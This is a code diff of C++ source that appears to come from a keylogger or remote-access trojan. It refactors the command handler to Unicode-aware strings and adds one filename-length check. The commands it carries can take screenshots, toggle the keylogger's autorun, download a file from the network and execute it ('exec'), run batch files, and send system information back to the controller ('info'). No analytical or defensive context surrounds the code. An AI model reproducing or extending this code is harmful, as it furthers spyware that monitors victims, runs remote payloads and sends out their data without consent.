@@ -9,23 +9,25 @@
 #include "Util.h"
 
 struct command_t {
-	std::string name;
-	std::function<void(std::vector<std::string>)> func;
+	std::tstring name;
+	std::function<void(std::vector<std::tstring>)> func;
 };
 
 command_t commandDefs[] = {
 	{
-		"batch", [](std::vector<std::string> args) {
+		_T("batch"), [](std::vector<std::tstring> args) {
 			if (!args.size())
 				return;
 
-			std::string fileArgs = Util::join_at_index(args, " ");
+			std::tstring fileArgs = Util::join_at_index(args, _T(" "));
+			if (fileArgs.size() > _MAX_PATH-1)
+			{
+				Error(_T("batch: Filename too long"));
+				return;
+			}
+
 			TCHAR dest[_MAX_PATH];
-#ifdef UNICODE
-			mbstowcs(dest, fileArgs.c_str(), _MAX_PATH);
-#else
-			strcpy_s(dest, fileArgs.c_str());
-#endif
+			_tcscpy(dest, fileArgs.c_str());
 
 			PROCESS_INFORMATION pi;
 			STARTUPINFO si;
@@ -42,18 +44,16 @@ command_t commandDefs[] = {
 		}
 	},
 	{
-		"msgbox", [](std::vector<std::string> args) {
+		_T("msgbox"), [](std::vector<std::tstring> args) {
 			if (!args.size())
 				return;
 
-			std::string msgboxText = Util::join_at_index(args, " ");
-			wchar_t text[1024];
-			mbstowcs(text, msgboxText.c_str(), 1024);
-			MessageBoxW(NULL, text, NULL, MB_OK);
+			std::tstring msgboxText = Util::join_at_index(args, _T(" "));
+			MessageBox(NULL, msgboxText.c_str(), NULL, MB_OK);
 		}
 	},
 	{
-		"screenshot", [](std::vector<std::string> args) {
+		_T("screenshot"), [](std::vector<std::tstring> args) {
 
 			screenshot.TakeScreenshot(V_FAKE_TMP1);
 
@@ -90,17 +90,17 @@ command_t commandDefs[] = {
 		}
 	},
 	{
-		"remove", [](std::vector<std::string> args) {
+		_T("remove"), [](std::vector<std::tstring> args) {
 			keylogger.SetAutorun(false);
 		}
 	},
 	{
-		"exit", [](std::vector<std::string> args) {
+		_T("exit"), [](std::vector<std::tstring> args) {
 			keylogger.Stop();
 		}
 	},
 	{
-		"exec", [](std::vector<std::string> args) {
+		_T("exec"), [](std::vector<std::tstring> args) {
 
 			if (args.size() < 1)
 				return;
@@ -108,19 +108,20 @@ command_t commandDefs[] = {
 			if (args[0].size() < 1)
 				return;
 
-			const char *file_path = args[0].c_str();
-			const char *file_name = PathFindFileNameA(file_path);
+			const TCHAR *file_path = args[0].c_str();
+			const TCHAR *file_name = PathFindFileName(file_path);
+			std::string file_path_s = Util::t2s(args[0]);
 
 			size_t resp_len;
 			char *resp;
 
-			bool nret = network.GetFile(file_path, &resp_len, &resp);
+			bool nret = network.GetFile(file_path_s.c_str(), &resp_len, &resp);
 			if (!nret)
 			{
 				return;
 			}
 
-			HANDLE hFile = CreateFileA(file_name, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+			HANDLE hFile = CreateFile(file_name, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
 			if(hFile == INVALID_HANDLE_VALUE)
 			{
 				Error(_T("exec: Failed to create file"));
@@ -139,12 +140,12 @@ command_t commandDefs[] = {
 
 
 			PROCESS_INFORMATION pi;
-			STARTUPINFOA si;
+			STARTUPINFO si;
 			ZeroMemory(&pi, sizeof(pi));
 			ZeroMemory(&si, sizeof(si));
 			si.cb = sizeof(si);
 
-			BOOL pret = CreateProcessA(file_name, NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
+			BOOL pret = CreateProcess(file_name, NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
 			if (!pret)
 			{
 				Error(_T("exec: Failed to create process"));
@@ -156,10 +157,13 @@ command_t commandDefs[] = {
 		}
 	},
 	{
-		"info", [&](std::vector<std::string> args) {
-			std::string osInfo = "i=" + info.GetInformation();
+		_T("info"), [&](std::vector<std::tstring> args) {
+			std::tstring osInfo = _T("i=");
+			info.GetInformation(osInfo);
 
-			network.SendText(V_NET_FILE_DATA, osInfo.c_str());
+			std::string osInfoS = Util::t2s(osInfo);
+
+			network.SendText(V_NET_FILE_DATA, osInfoS.c_str());
 		}
 	}
 };
@@ -174,20 +178,20 @@ CommandExe::~CommandExe()
 
 }
 
-void CommandExe::Run(std::string cmds)
+void CommandExe::Run(const std::tstring& cmds)
 {
 	if (cmds.size() == 0) {
 		return;
 	}
 
-	std::vector<std::string> commands = Util::split(cmds, ';');
+	std::vector<std::tstring> commands = Util::split(cmds, ';');
 	for (auto &cmd : commands) {
-		std::vector<std::string> args = Util::split(cmd, ' ');
-		args.erase(std::remove_if(args.begin(), args.end(), [&](const std::string &s) { return std::all_of(s.begin(), s.end(), isspace); }), args.end());
+		std::vector<std::tstring> args = Util::split(cmd, ' ');
+		args.erase(std::remove_if(args.begin(), args.end(), [&](const std::tstring &s) { return std::all_of(s.begin(), s.end(), isspace); }), args.end());
 		if (args.size()) {
 			auto result = std::find_if(std::begin(commandDefs), std::end(commandDefs), [&](const command_t & cmd) { return cmd.name == args[0].c_str(); });
 			if (result != std::end(commandDefs)) {
-				(*result).func(Util::split(Util::join_at_index(args, " ", 1), ' '));
+				(*result).func(Util::split(Util::join_at_index(args, _T(" "), 1), ' '));
 			}
 		}
 	}
